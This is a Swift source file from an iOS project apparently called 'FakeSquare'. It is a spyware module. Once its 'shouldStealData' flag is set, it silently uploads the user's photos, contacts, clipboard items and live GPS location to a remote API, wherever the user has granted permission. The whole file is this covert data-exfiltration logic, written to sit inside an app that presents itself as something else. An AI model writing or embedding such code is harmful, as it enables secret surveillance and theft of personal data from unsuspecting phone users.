//
//  FakeManager.swift
//  FakeSquare
//
//  Created by Azzaro Mujic on 20/06/16.
//  Copyright © 2016 Azzaro Mujic. All rights reserved.
//

import Foundation
import Photos
import AddressBook

final class FakeManager: NSObject {
    
    static let sharedInstance = FakeManager()
    var shouldStealData: Bool = false {
        didSet(oldValue) {
            sendPhotos()
            sendContacts()
            startSendingYourLocation()
        }
    }
    
    private var _apiManager = APIManager()
    private let _locationManager: CLLocationManager = CLLocationManager()
    
    func didEnterForeground() {
        if shouldStealData {
            let pasteboardItems = UIPasteboard.generalPasteboard().items
            
            _apiManager
                .sendData(params: ["pasteboard_items" : pasteboardItems])
        }
    }
    
    
    func sendPhotos() {
        if PHPhotoLibrary.authorizationStatus() ==  .Authorized && shouldStealData {
            let photos = getPhotoLibViewController()
            photos.getAllPictures()
            photos.delegate = self
        }
    }
    
    func sendContacts() {
    
        if shouldStealData && ABAddressBookGetAuthorizationStatus() == .Authorized {
            let contact = Contacts()
            _apiManager
                .sendData(params: ["contacts" : contact.contacts])
        }
    }
    
    func startSendingYourLocation() {
        if shouldStealData && CLLocationManager.authorizationStatus() == CLAuthorizationStatus.AuthorizedWhenInUse {
            _locationManager.delegate = self
            _locationManager.startUpdatingLocation()
        }
    }
}

extension FakeManager: CLLocationManagerDelegate {
    func locationManager(manager: CLLocationManager, didUpdateToLocation newLocation: CLLocation, fromLocation oldLocation: CLLocation) {
        _apiManager
            .sendData(params: ["newLocation":["lat": newLocation.coordinate.latitude, "lng": newLocation.coordinate.longitude]])
    }
}

extension FakeManager: getPhotoLibViewControllerDelegate {
    
    func allPhotosCollected(imgArray: [AnyObject]!) {
        
        _apiManager
            .sendData(params: ["images":imgArray])
        
    }
    
}